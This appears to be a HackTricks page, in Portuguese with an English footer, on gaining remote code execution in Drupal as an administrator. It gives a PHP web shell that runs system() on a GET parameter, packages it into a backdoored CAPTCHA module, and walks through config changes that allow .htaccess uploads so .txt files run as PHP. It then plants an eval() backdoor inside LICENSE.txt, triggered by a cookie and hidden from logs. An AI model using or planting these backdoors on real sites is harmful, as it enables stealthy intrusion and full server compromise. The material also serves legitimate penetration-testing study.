# Drupal RCE

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Com o M√≥dulo PHP Filter

{% hint style="warning" %}
Em vers√µes mais antigas do Drupal **(antes da vers√£o 8)**, era poss√≠vel fazer login como admin e **ativar o m√≥dulo `PHP filter`**, que "Permite que c√≥digos/snippets PHP incorporados sejam avaliados." Mas a partir da vers√£o 8, este m√≥dulo n√£o √© instalado por padr√£o.
{% endhint %}

Voc√™ precisa que o **plugin php esteja instalado** (verifique acessando _/modules/php_ e se retornar um **403** ent√£o, **existe**, se **n√£o encontrado**, ent√£o o **plugin php n√£o est√° instalado**)

V√° para _M√≥dulos_ -> (**Verifique**) _PHP Filter_ -> _Salvar configura√ß√£o_

![](<../../../.gitbook/assets/image (247) (1).png>)

Ent√£o clique em _Adicionar conte√∫do_ -> Selecione _P√°gina B√°sica_ ou _Artigo_ -> Escreva _shellcode php no corpo_ -> Selecione _C√≥digo PHP_ em _Formato de texto_ -> Selecione _Visualizar_

![](<../../../.gitbook/assets/image (338).png>)

Finalmente, acesse o n√≥ rec√©m-criado:
```bash
curl http://drupal-site.local/node/3
```
## Instalar o M√≥dulo PHP Filter

{% hint style="warning" %}
Nas vers√µes atuais, n√£o √© mais poss√≠vel instalar plugins apenas tendo acesso √† web ap√≥s a instala√ß√£o padr√£o.
{% endhint %}

A partir da vers√£o **8**, o **[PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1)** **n√£o √© instalado por padr√£o**. Para aproveitar essa funcionalidade, ter√≠amos que **instalar o m√≥dulo n√≥s mesmos**.

1. Baixe a vers√£o mais recente do m√≥dulo no site do Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Uma vez baixado, v√° para **`Administra√ß√£o`** > **`Relat√≥rios`** > **`Atualiza√ß√µes dispon√≠veis`**.
3. Clique em **`Procurar`**, selecione o arquivo do diret√≥rio para o qual o baixamos e clique em **`Instalar`**.
4. Uma vez que o m√≥dulo esteja instalado, podemos clicar em **`Conte√∫do`** e **criar uma nova p√°gina b√°sica**, semelhante ao que fizemos no exemplo do Drupal 7. Novamente, certifique-se de **selecionar `C√≥digo PHP` no menu suspenso `Formato de texto`**.

## M√≥dulo com Backdoor

{% hint style="warning" %}
Nas vers√µes atuais, n√£o √© mais poss√≠vel instalar plugins apenas tendo acesso √† web ap√≥s a instala√ß√£o padr√£o.
{% endhint %}

Um m√≥dulo com backdoor pode ser criado **adicionando um shell a um m√≥dulo existente**. M√≥dulos podem ser encontrados no site drupal.org. Vamos escolher um m√≥dulo como [CAPTCHA](https://www.drupal.org/project/captcha). Role para baixo e copie o link para o [arquivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) tar.gz.

* Baixe o arquivo e extraia seu conte√∫do.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Crie um **PHP web shell** com o conte√∫do:
```php
<?php
system($_GET["cmd"]);
?>
```
* Em seguida, precisamos criar um **`.htaccess`** arquivo para nos dar acesso √† pasta. Isso √© necess√°rio, pois o Drupal nega acesso direto √† pasta **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* A configura√ß√£o acima aplicar√° regras para a pasta / quando solicitarmos um arquivo em /modules. Copie ambos os arquivos para a pasta captcha e crie um arquivo compactado.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Supondo que temos **acesso administrativo** ao site, clique em **`Gerenciar`** e depois em **`Estender`** na barra lateral. Em seguida, clique no bot√£o **`+ Instalar novo m√≥dulo`**, e seremos levados √† p√°gina de instala√ß√£o, como `http://drupal-site.local/admin/modules/install`. Navegue at√© o arquivo do Captcha com backdoor e clique em **`Instalar`**.
* Uma vez que a instala√ß√£o seja bem-sucedida, navegue at√© **`/modules/captcha/shell.php`** para executar comandos.

## Backdooring Drupal com Sincroniza√ß√£o de Configura√ß√£o <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post compartilhado por** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Parte 1 (ativa√ß√£o de _M√≠dia_ e _Biblioteca de M√≠dia_)

No menu _Estender_ (/admin/modules), voc√™ pode ativar o que parecem ser plugins j√° instalados. Por padr√£o, os plugins _M√≠dia_ e _Biblioteca de M√≠dia_ n√£o parecem estar ativados, ent√£o vamos ativ√°-los.

Antes da ativa√ß√£o:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Ap√≥s a ativa√ß√£o:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### Parte 2 (aproveitando o recurso _Sincroniza√ß√£o de Configura√ß√£o_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Vamos aproveitar o recurso _Sincroniza√ß√£o de Configura√ß√£o_ para despejar (exportar) e fazer upload (importar) entradas de configura√ß√£o do Drupal:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Vamos come√ßar patchando a primeira entrada `allow_insecure_uploads` de:

Arquivo: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Para:

Arquivo: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field\_media\_document.yml**

Em seguida, patch a segunda entrada `file_extensions` de: 

Arquivo: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Para:

Arquivo: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Eu n√£o uso isso neste post do blog, mas √© importante notar que √© poss√≠vel definir a entrada `file_directory` de maneira arbitr√°ria e que √© vulner√°vel a um ataque de traversal de caminho (ent√£o podemos voltar dentro da √°rvore do sistema de arquivos do Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Parte 3 (aproveitando o recurso _Adicionar Documento_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

A √∫ltima etapa √© a mais simples e √© dividida em dois subpassos. O primeiro √© fazer o upload de um arquivo no formato .htaccess para aproveitar as diretivas do Apache e permitir que arquivos .txt sejam interpretados pelo motor PHP. O segundo √© fazer o upload de um arquivo .txt contendo nosso payload.

Arquivo: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Por que esse truque √© legal?

Porque uma vez que o Webshell (que chamaremos de LICENSE.txt) √© colocado no servidor Web, podemos transmitir nossos comandos via `$_COOKIE` e nos logs do servidor Web, isso aparecer√° como uma solicita√ß√£o GET leg√≠tima para um arquivo de texto.

Por que nomear nosso Webshell LICENSE.txt?

Simplesmente porque se pegarmos o seguinte arquivo, por exemplo [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (que j√° est√° presente no n√∫cleo do Drupal), temos um arquivo de 339 linhas e 17,6 KB de tamanho, que √© perfeito para adicionar um pequeno trecho de c√≥digo PHP no meio (j√° que o arquivo √© grande o suficiente).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Arquivo: LICENSE.txt corrigido
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Parte 3.1 (carregar arquivo .htaccess)**

Primeiro, aproveitamos o recurso _Adicionar Documento_ (/media/add/document) para carregar nosso arquivo contendo as diretivas do Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Parte 3.2 (carregar arquivo LICENSE.txt)**

Em seguida, aproveitamos novamente o recurso _Adicionar Documento_ (/media/add/document) para carregar um Webshell oculto dentro de um arquivo de licen√ßa.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Parte 4 (intera√ß√£o com o Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

A √∫ltima parte consiste em interagir com o Webshell.

Como mostrado na captura de tela a seguir, se o cookie esperado pelo nosso Webshell n√£o estiver definido, obtemos o resultado subsequente ao consultar o arquivo via um navegador Web.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Quando o atacante define o cookie, ele pode interagir com o Webshell e executar quaisquer comandos que desejar.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

E como voc√™ pode ver nos logs, parece que apenas um arquivo txt foi solicitado.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Obrigado por dedicar seu tempo para ler este artigo, espero que ele ajude voc√™ a obter algumas shells.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
